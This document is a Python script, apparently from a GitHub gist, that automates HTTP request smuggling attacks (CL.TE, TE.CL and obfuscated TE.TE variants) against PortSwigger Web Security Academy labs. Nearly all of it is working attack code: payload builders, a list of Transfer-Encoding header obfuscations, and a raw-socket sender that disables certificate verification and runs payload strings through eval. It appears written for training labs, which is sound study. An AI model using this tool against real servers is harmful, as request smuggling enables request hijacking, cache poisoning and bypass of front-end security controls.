##
## https://gist.github.com/karanlyons/5a3bdee774a5db5f8008ea65c8249b6a
##
#############################
#!/usr/bin/python3
#############################

import dataclasses
import re
import socket
import ssl as _ssl
import types
from collections import namedtuple, OrderedDict
from dataclasses import dataclass
from io import StringIO
from itertools import chain
from textwrap import dedent, indent
from time import time
from typing import Union
from urllib.parse import urlparse

try:
	from pygments import highlight as _highlight
	from pygments.formatters.terminal256 import Terminal256Formatter
	from pygments.lexers import get_lexer_for_mimetype
	from pygments.lexers.textfmts import HttpLexer

except ImportError:
	import warnings
	warnings.warn('Pygments not found, highlighting unavailable.')
	
	http_lexer, formatter = None, None
	def _highlight(raw: Union[str, bytes], http_lexer: None, formatter: None) -> str:
		return raw.decode('utf-8') if isinstance(raw, bytes) else raw
	
	def colorize(tokens: Union[tuple, list]) -> str:
		return ''.join(value for ttype, value in tokens)

else:
	http_lexer = HttpLexer(stripnl=False, ensurenl=False, encoding='utf-8')
	formatter = Terminal256Formatter()
	
	def colorize(tokens: Union[tuple, list]) -> str:
		with StringIO() as out:
			formatter.format(tokens, out)
			return out.getvalue()


def highlight(raw: str) -> str:
	highlighted = _highlight(raw, http_lexer, formatter)
	if highlighted[-1] == '\n':
		highlighted = highlighted[:-1] + '⏎\n'
	
	return highlighted

def prefix_lines(str: str, prefix: str) -> str:
	return indent(str, prefix, lambda line: True)
def highlight_req(raw: str) -> str: return prefix_lines(highlight(raw), '< ')
def highlight_resp(raw: str) -> str: return prefix_lines(highlight(raw), '> ')


SocketTimings = namedtuple('SocketTimings', ('connect', 'sendall', 'recv'))

def request(host: str, data: Union[str, bytes], ssl=True):
	if isinstance(data, str): data = data.encode('utf-8')
	
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	conn_time = time()
	sock.connect((host, 443 if ssl else 80))
	conn_time = time() - conn_time
	
	if ssl:
		sock = _ssl.wrap_socket(
			sock,
			keyfile=None,
			certfile=None,
			server_side=False,
			cert_reqs=_ssl.CERT_NONE,
			ssl_version=_ssl.PROTOCOL_SSLv23,
		)
	
	print(f'{highlight_req(data)}•')
	send_time = time()
	sock.sendall(data)
	send_time = time() - send_time
	
	resp = b''
	length = None
	recv_time = time()
	while True:
		buf = sock.recv(4096)
		
		if buf:
			resp += buf
			if length is None:
				length_offset = resp.find(b'Content-Length:')
				if length_offset > -1:
					length = int(resp[length_offset + 15:].split(b'\r\n', 1)[0].strip())
		
		if not buf or (
			length is not None and
			b'\r\n\r\n' in resp and # Have full headers and >=0 bytes of content
			len(resp.split(b'\r\n\r\n', 1)[1]) >= length
		):
			recv_time = time() - recv_time
			sock.close()
			break
	
	print(highlight_resp(resp.decode('utf-8')))
	print(colorize((
		('Token.Keyword', 'conn:'),
		('Token', ' %10.10fs, ' % conn_time),
		('Token.Keyword', 'send:'),
		('Token', ' %10.10fs, ' % send_time),
		('Token.Keyword', 'recv:'),
		('Token', ' %10.10fs\n' % recv_time),
	)))
	
	return SocketTimings(conn_time, send_time, recv_time)


@dataclass
class Request:
	host: str
	method: str = 'GET'
	path: str = '/'
	headers: Union[OrderedDict, dict] = dataclasses.field(default_factory=OrderedDict)
	raw_headers: str = ''
	data: str = ''
	
	def __post_init__(self):
		if not isinstance(self.headers, OrderedDict):
			self.headers = OrderedDict(self.headers)
		
		if 'Host' not in self.headers:
			self.headers['Host'] = self.host
			self.headers.move_to_end('Host', last=False)
		
		self.headers.setdefault('Content-Length', len(self.data))
	
	@property
	def asdict(self) -> dict:
		return self.__dict__
	
	def clone(self, **kwargs):
		return Request(
			**dict(
				self.asdict,
				**kwargs
			)
		)
	
	def __str__(self) -> str:
		headers = '\r\n'.join(chain.from_iterable(
			(f'{header}: {v}' for v in value)
			if isinstance(value, (tuple, list, types.GeneratorType))
			else (f'{header}: {value}',)
			for header, value in self.headers.items()
		)) + '\r\n' + self.raw_headers
		
		return f'{self.method} {self.path} HTTP/1.1\r\n{headers}\r\n{self.data}'
	
	def __len__(self) -> int:
		return len(str(self))


def lenhex(data) -> str: return '%x' % len(data)

def clte(mask: Request, payload: Union[Request, str]) -> Request:
	headers = mask.headers.copy()
	headers['Transfer-Encoding'] = 'chunked'
	del(headers['Content-Length'])
	
	if mask.data:
		data = f'{lenhex(mask.data)}\r\n{mask.data}\r\n0\r\n\r\n{payload}'
	else:
		data = f'0\r\n\r\n{payload}'
	
	return mask.clone(
		headers=headers,
		data=data,
	)

def tecl(mask: Request, payload: Union[Request, str]) -> Request:
	headers = mask.headers.copy()
	headers['Transfer-Encoding'] = 'chunked'
	
	if isinstance(payload, Request):
		payload = payload.clone(
			headers=dict(
				payload.headers,
				# len(crlf + terminating chunk) == 7
				**{'Content-Length': payload.headers['Content-Length'] + 7},
			),
		)
	
	payload_length = lenhex(payload)
	headers['Content-Length'] = len(payload_length) + 2 # len(chunk length header)
	
	return mask.clone(
		headers=headers,
		data=f'{payload_length}\r\n{payload}\r\n0\r\n\r\n',
	)


OBFUSCATIONS = [
	{'Transfer-Encoding': ('chunked', 'punked')},
	{'Transfer-Encoding': ('punked', 'chunked')},
	{'Transfer-Encoding': ('chunked', 'identity')},
	{'Transfer-Encoding': ('identity', 'chunked')},
	{'Transfer-Encoding': (' chunked')},
	{'Transfer-Encoding': ('chunked ')},
	{'Transfer-Encoding': (' chunked ')},
	{'Transfer-Encoding ': ('chunked')},
	{' Transfer-Encoding': ('chunked')},
	{' Transfer-Encoding ': ('chunked')},
	'Transfer-Encoding:\tchunked\r\n',
	'Transfer-Encoding:\tchunked\r\n',
	'X-Obfuscate: 1\nTransfer-Encoding: chunked\r\n',
	'Transfer-Encoding\n: chunked\r\n',
]


def tete(
	mask: Request,
	payload: Union[Request, str],
	obfuscation: Union[dict, str],
	parent: Union[clte, tecl],
) -> Request:
	package = parent(mask, payload)
	
	if isinstance(obfuscation, dict):
		return package.clone(
			headers=dict(
				package.headers,
				**obfuscation,
			),
		)
	else:
		headers = package.headers
		del(headers['Transfer-Encoding'])
		
		return package.clone(
			headers=headers,
			raw_headers=obfuscation
		)

def teto(
	mask: Request,
	payload: Union[Request, str],
	obfuscation: Union[dict, str]
) -> Request:
	return tete(mask, payload, obfuscation, tecl)

def tote(
	mask: Request,
	payload: Union[Request, str],
	obfuscation: Union[dict, str]
) -> Request:
	return tete(mask, payload, obfuscation, clte)


def HostlessRequest(*args, **kwargs): return lambda host: Request(host, *args, **kwargs)

def run(key: str, host: str):
	if not re.match(r'^[a-zA-Z0-9+.-]+://.*', host): host = 'unknown://' + host
	host = urlparse(host).netloc
	
	reqs = LABS[key]
	
	for req in reqs:
		if isinstance(req, tuple):
			func, *reqs = req
			req = func(*(
				req(host) if callable(req) else req
				for req in reqs
			))
		if callable(req):
			req = req(host)
		if isinstance(req, Request):
			data = str(req)
		else:
			data = eval(f'f"""{dedent(req)[1:-1]}"""').replace('\n', '\r\n')
		
		request(host, data)


LABS = {
	'https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te': (
		(clte, HostlessRequest('POST'), 'G'),
		HostlessRequest('POST'),
	),
	'https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl': (
		(tecl, HostlessRequest('POST'), HostlessRequest('GPOST')),
		HostlessRequest(),
	),
	'https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header': (
		(teto, HostlessRequest('POST'), HostlessRequest('GPOST'), OBFUSCATIONS[0]),
		HostlessRequest(),
	),
}


if __name__ == '__main__':
	run(
		'https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header',
		'https://aca21fef1e14650680ae141f0097002e.web-security-academy.net/',
	)
  
######################################
##
##
